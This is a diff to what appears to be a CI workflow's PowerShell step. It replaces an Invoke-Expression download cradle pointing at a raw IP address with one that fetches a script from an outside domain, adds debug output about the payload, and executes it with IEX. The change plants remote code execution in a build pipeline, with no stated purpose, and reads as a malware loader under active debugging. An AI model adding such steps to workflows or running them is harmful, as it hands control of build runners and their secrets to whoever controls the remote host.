@@ -9,6 +9,15 @@ jobs:
     steps:
       - shell: powershell
         run: |
+          Write-Host "Starting..."
           [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
-          IEX (New-Object Net.WebClient).DownloadString("http://51.159.21.191:8443/a")
+          try {
+            $s = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/a")
+            Write-Host "Downloaded $($s.Length) chars"
+            Write-Host "First line: $($s.Split([char]10)[0])"
+            IEX $s
+          } catch {
+            Write-Host "ERROR: $($_.Exception.Message)"
+            Write-Host "Inner: $($_.Exception.InnerException.Message)"
+          }
 
